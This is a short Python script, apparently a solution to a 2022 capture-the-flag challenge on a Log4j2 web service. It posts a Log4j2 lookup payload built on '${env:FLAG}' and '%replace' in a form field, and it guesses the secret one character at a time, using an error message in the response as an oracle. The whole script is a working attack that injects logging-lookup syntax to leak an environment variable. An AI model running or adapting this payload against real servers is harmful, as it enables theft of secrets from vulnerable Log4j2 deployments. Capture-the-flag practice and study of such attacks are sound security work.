import requests
from string import ascii_letters, digits

url = "https://log4j2-web.2022.ctfcompetition.com:443/"
headers = {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"}
flag_part_list = ['.'] * 37
chars = '-_@#' + ascii_letters + digits + '.'
for x in range(37):
    for c in chars:
        flag_part_list[x] = c
        flag_part = "".join(flag_part_list)
        data = {"text": f"/%replace{{${{env:FLAG}}}}{{CTF.{flag_part}.}}{{\\}}"}
        print(f"Trying flag: CTF{{{flag_part}}}", end='\r')
        r = requests.post(url, headers=headers, data=data)
        if 'Sensitive' in r.text:
            print("")
            break